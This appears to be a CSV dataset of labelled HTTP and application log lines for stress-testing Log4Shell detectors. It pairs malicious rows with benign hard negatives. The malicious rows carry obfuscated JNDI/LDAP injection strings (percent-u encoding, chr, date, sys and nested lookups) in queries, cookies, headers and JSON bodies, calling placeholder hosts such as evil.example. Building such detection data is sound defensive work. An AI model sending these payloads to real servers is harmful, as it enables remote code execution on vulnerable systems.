id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
OOD-900209,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only,warn unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900166,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900166,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1 trace_id=benign-ood-900166,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900129,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}&request_id=ood-900129 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}&request_id=ood-900129 http/1.1 host: victim.local,1,log4shell,unsupported_lookup_namespace,query,ood_stress_test,critical
OOD-900147,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900147,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900147,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900272,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900272,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900272,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900196,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900196,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900196,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900012,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}; sid=ood900012,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}; sid=ood900012,1,log4shell,unsupported_lookup_namespace,cookie,ood_stress_test,critical
OOD-900204,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation trace_id=benign-ood-900204","info rendered json string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation trace_id=benign-ood-900204",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900137,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}&request_id=ood-900137 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}&request_id=ood-900137 http/1.1 host: victim.local,1,log4shell,charcode_lookup_reconstruction,query,ood_stress_test,critical
OOD-900172,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900172,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900172,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900052,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D; sid=ood900052,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d; sid=ood900052,1,log4shell,iis_percent_u_encoding,cookie,ood_stress_test,critical
OOD-900214,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900214,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1 trace_id=benign-ood-900214,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900003,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.3 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.3 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d,1,log4shell,iis_percent_u_encoding,header,ood_stress_test,critical
OOD-900124,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D; sid=ood900124,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d; sid=ood900124,1,log4shell,iis_percent_u_encoding,cookie,ood_stress_test,critical
OOD-900178,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation trace_id=benign-ood-900178","info rendered json string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation trace_id=benign-ood-900178",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900002,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d"",""host"":""evil.example""}",1,log4shell,iis_percent_u_encoding,json,ood_stress_test,critical
OOD-900164,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900164,warn unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900164,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900188,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only trace_id=benign-ood-900188,warn unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only trace_id=benign-ood-900188,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900118,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}"",""host"":""probe.example.net""}",1,log4shell,protocol_fragment_sys_lookup,json,ood_stress_test,critical
OOD-900202,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation trace_id=benign-ood-900202","info rendered json string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation trace_id=benign-ood-900202",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900086,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://callback.local/date-fragment}"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://callback.local/date-fragment}"",""host"":""callback.local""}",1,log4shell,date_lookup_reconstruction,json,ood_stress_test,critical
OOD-900011,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.11 | X-Api-Version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.11 | x-api-version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace},1,log4shell,unsupported_lookup_namespace,header,ood_stress_test,critical
OOD-900070,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}"",""host"":""log4j-test.invalid""}",1,log4shell,protocol_fragment_sys_lookup,json,ood_stress_test,critical
OOD-900088,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://callback.local/date-fragment}; sid=ood900088,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://callback.local/date-fragment}; sid=ood900088,1,log4shell,date_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900001,2026-05-17,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D&request_id=ood-900001 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d&request_id=ood-900001 http/1.1 host: victim.local,1,log4shell,iis_percent_u_encoding,query,ood_stress_test,critical
OOD-900250,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation trace_id=benign-ood-900250","info rendered json string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation trace_id=benign-ood-900250",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900157,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900120,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}; sid=ood900120,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}; sid=ood900120,1,log4shell,protocol_fragment_sys_lookup,cookie,ood_stress_test,critical
OOD-900256,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup trace_id=benign-ood-900256,info tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup trace_id=benign-ood-900256,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900162,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900162,warn unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900162,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900030,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}"",""host"":""attacker.evil.com""}",1,log4shell,sys_lookup_separator,json,ood_stress_test,critical
OOD-900190,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900190,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900190,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900275,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation trace_id=benign-ood-900275","info rendered json string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation trace_id=benign-ood-900275",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900114,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}"",""host"":""probe.example.net""}",1,log4shell,charcode_lookup_reconstruction,json,ood_stress_test,critical
OOD-900058,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}"",""host"":""log4j-test.invalid""}",1,log4shell,unsupported_lookup_namespace,json,ood_stress_test,critical
OOD-900131,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.131 | X-Api-Version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.131 | x-api-version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace},1,log4shell,unsupported_lookup_namespace,header,ood_stress_test,critical
OOD-900232,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup trace_id=benign-ood-900232,info tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup trace_id=benign-ood-900232,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900025,2026-05-17,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D&request_id=ood-900025 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d&request_id=ood-900025 http/1.1 host: victim.local,1,log4shell,iis_percent_u_encoding,query,ood_stress_test,critical
OOD-900112,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://probe.example.net/date-fragment}; sid=ood900112,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://probe.example.net/date-fragment}; sid=ood900112,1,log4shell,date_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900234,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only trace_id=benign-ood-900234,warn unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only trace_id=benign-ood-900234,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900254,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup trace_id=benign-ood-900254,info tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup trace_id=benign-ood-900254,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900224,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900224,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900224,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900065,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}&request_id=ood-900065 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}&request_id=ood-900065 http/1.1 host: victim.local,1,log4shell,charcode_lookup_reconstruction,query,ood_stress_test,critical
OOD-900062,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://log4j-test.invalid/date-fragment}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://log4j-test.invalid/date-fragment}"",""host"":""log4j-test.invalid""}",1,log4shell,date_lookup_reconstruction,json,ood_stress_test,critical
OOD-900046,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}"",""host"":""attacker.evil.com""}",1,log4shell,protocol_fragment_sys_lookup,json,ood_stress_test,critical
OOD-900006,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}"",""host"":""evil.example""}",1,log4shell,sys_lookup_separator,json,ood_stress_test,critical
OOD-900286,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900286,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1 trace_id=benign-ood-900286,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900072,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}; sid=ood900072,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}; sid=ood900072,1,log4shell,protocol_fragment_sys_lookup,cookie,ood_stress_test,critical
OOD-900260,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900260,warn unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900260,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900266,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900266,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900266,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900191,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900191,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1 trace_id=benign-ood-900191,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900225,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation","info rendered json string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900056,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}; sid=ood900056,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}; sid=ood900056,1,log4shell,sys_lookup_separator,cookie,ood_stress_test,critical
OOD-900081,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}&request_id=ood-900081 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}&request_id=ood-900081 http/1.1 host: victim.local,1,log4shell,unsupported_lookup_namespace,query,ood_stress_test,critical
OOD-900153,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation","info rendered json string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900219,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900219,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900219,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900033,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}&request_id=ood-900033 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}&request_id=ood-900033 http/1.1 host: victim.local,1,log4shell,unsupported_lookup_namespace,query,ood_stress_test,critical
OOD-900140,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}; sid=ood900140,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}; sid=ood900140,1,log4shell,charcode_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900156,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation trace_id=benign-ood-900156","info rendered json string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation trace_id=benign-ood-900156",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900221,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900163,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900163,warn unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only trace_id=benign-ood-900163,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900107,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.107 | X-Api-Version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.107 | x-api-version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace},1,log4shell,unsupported_lookup_namespace,header,ood_stress_test,critical
OOD-900276,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation trace_id=benign-ood-900276","info rendered json string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation trace_id=benign-ood-900276",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900132,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}; sid=ood900132,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}; sid=ood900132,1,log4shell,unsupported_lookup_namespace,cookie,ood_stress_test,critical
OOD-900130,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}"",""host"":""lab-callback.example.org""}",1,log4shell,unsupported_lookup_namespace,json,ood_stress_test,critical
OOD-900222,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900222,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900222,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
